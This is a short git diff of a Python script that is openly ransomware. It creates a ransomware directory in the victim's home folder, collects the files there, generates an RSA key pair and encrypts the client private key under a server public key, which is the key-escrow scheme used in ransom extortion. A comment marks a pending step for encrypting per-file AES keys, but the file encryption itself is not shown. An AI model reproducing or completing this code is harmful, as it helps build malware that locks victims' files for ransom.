@@ -27,12 +27,18 @@ def menu():
     username = enviroment.get_username()
     ransomware_path = os.path.join(home, ransomware_name[0])
 
+    # create ransomware directory 
     os.mkdir(ransomware_path, 0600)
 
 
     # get the files in the home directory
     # /home/$USER
     files = get_files.find_files(home)
+
+
+
+
+
 
     # create RSA object
     rsa_object = asymmetric.assymetric()
@@ -44,16 +50,19 @@ def menu():
     Client_public_key = rsa_object.public_key_PEM
 
     # encrypt the client private key with servers public key
-    encrypted_private_key = server_public_key_object.encrypt(Client_private_key)
+    encrypted_private_key = server_public_key_object.encrypt(Client_private_key, 'x')[0]
     with open(ransomware_path + "encrypted_private_key", 'wb') as f:
         f.write(encrypted_private_key)
     
-    
-
-
 
     # rsa_object = None # ????
     # gc.clean()
+
+    # encrypt all the AES keys with Client public key 
+
+
+
+
 
 
 
